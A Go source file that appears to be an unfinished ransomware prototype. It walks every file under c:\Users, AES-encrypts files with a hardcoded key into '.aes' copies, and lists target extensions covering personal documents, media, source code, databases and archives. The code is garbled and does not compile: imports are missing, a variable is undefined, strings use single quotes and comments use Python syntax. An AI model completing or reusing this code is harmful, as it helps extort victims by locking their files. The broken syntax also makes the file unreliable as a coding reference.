package main

import (
	"os"
	"net/http"
	"crypto"
	"fmt"
	"path/filepath"
)

func search() ([]string, error){
	dir := "c:\Users"
	
	fileList := make([]string, 0)
	e := filepath.Walk(dir, func(path string, f os.FileINfo, err error) error {
		fileList = append(fileList, path)
		return err
	})

	if e != nil {
		panic(e)
	}

	for _ , file := range fileList{
		fmt.Println(file)
	}

	return fileList, nil
}

func encrypt(src string) error {
	text, e := ioutil.ReadFile(src)
	if e != nil {
        	panic(e)
    	}

    	key := []byte("aserejejadejejeb")
    	block, e := aes.NewCipher(key)
    	if e != nil {
        	panic(e)
    	}

    	encrypt := make([]byte, aes.BlockSize+len(text))
    	iv := encrypt[:aes.BlockSize]
    	if _, e := io.ReadFull(rand.Reader, iv); e != nil {
        	panic(e)
    	}

    	stream := cipher.NewCFBEncrypter(block, iv)
    	stream.XORKeyStream(ciphertext[aes.BlockSize:], text)

    	f, e := os.Create(src + ".aes")
    	if e != nil {
        	panic(e)
    	}
    	_, e = io.Copy(f, bytes.NewReader(ciphertext))
    	if e != nil {
        	panic(e)
    	}
}

func main(){
	var extensions []string = {
	        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images
	        'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound
        	'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Video and movies

	        'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx', # Microsoft office
	        'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', # OpenOffice, Adobe, Latex, Markdown, etc
	        'yml', 'yaml', 'json', 'xml', 'csv', # structured data
        	'db', 'sql', 'dbf', 'mdb', 'iso', # databases and disc images

	        'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # web technologies
	        'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C source code
	        'java', 'class', 'jar', # java source code
	        'ps', 'bat', 'vb', # windows based scripts
        	'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # linux/mac based scripts
	        'go', 'py', 'pyc', 'bf', 'coffee', # other source code files

        	'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
	}
}

